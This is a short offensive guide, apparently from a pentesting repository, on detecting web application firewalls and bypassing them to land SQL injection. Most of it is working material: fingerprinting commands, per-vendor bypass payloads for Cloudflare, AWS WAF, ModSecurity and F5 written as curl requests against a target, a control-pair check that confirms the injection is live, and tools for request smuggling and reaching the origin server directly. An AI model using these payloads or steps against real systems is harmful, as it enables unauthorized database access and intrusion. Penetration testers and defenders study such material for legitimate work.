# HOW TO USE THE WAF_BYPASS FOLDER ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N steps (tactical)
1. Confirm a WAF is present: 
   - wafw00f https://target.com
   - or classic oddities: 404 page shape, missing headers, a "challenge" page, string fast-403 on ' or " AND.
2. Identify WHICH engine (per-waf-payload-ladders.txt): hit `?id=1'` and read the block page
   (Cloudflare 403 + cf-ray, Akamai AA001, ModSec "Malicious Request Blocked", F5 ASM "Request Blocked by Application Security").
3. Then skip to the matching ladder file and craft the smallest bypass set (usually 6-10 rules).
4. When possible, bypass end-to-end so the actual payload lands (SQLi/XSS/CMD). 
5. Validate the bypass with a CONTROLLED pair: ' AND 1=1 vs ' AND 1=2 must differ.

## How each ladder works (the N categories)
- Whitelist/term-separation: comments /* **, tabs %09, CRLF.
- Encoding: hex %6f%72, double-encode, entity &#111;.
- Case mix for case-sensitive matchers.
- Operator swap: 1=1 -> 1-0=1, OR->||, AND->&&.
- Function swap: SLEEP->BENCHMARK/IF; CHR/CHAR; base64-decode layer.
- Sign-proof: delete ' so the remaining is valid; smart hash rejections.

## Worked examples (concrete)
```
wafw00f -a https://target.com
identify:
curl -i "https://target.com/?id=1'" | grep -i "cf-ray\|akamai\|mod_security\|f5\|imperva\|sucuri"
then pull the ladder:
Cloudflare:  try  1'/**/OR/**/1=1-- -   and  1'%09OR%091=1-- -
curl -i "https://target.com/?id=1%27%09OR%091=1--"
AWS WAF (managed): 1' AND 1-1=0-- -
curl -i "https://target.com/?id=1%27%09AND%09(1=1)--"
ModSec/CRS: hex alpha + comment:
curl -i "https://target.com/?id=1%27%20AND%200x313D31--"
F5: pipe concat 1' || 1=1 -- -
curl -i "https://target.com/?id=1%27%20%7C%7C%201=1--"
terminator-only for hard cases:
curl -i "https://target.com/?id=1%27--+-"
encoded space:
curl -i "https://target.com/?id=1%2527%2520OR%25201%253D1--"
verify bypass (control pair):
curl -i "https://target.com/?id=1%27%09AND%091=1--"   # A -> normal
curl -i "https://target.com/?id=1%27%09AND%091=2--"   # B -> different = filter is beaten, injection live
```

## False positives
- A 403 on `'` from a generic app=login filter isn't a WAF - a WAF has a revolving block page.
- Don't report "WAF detected" - report the payload that actually PASSES the WAF to the vuln.

## Tools
- wafw00f, 0xacb/recollapse, commix / sqlmap --dbms=... --tamper=..., smuggler for CL.TE WAF edge,
  Burp BApp "WAF Detector", cloud-enum of origin IP to hit origin directly.
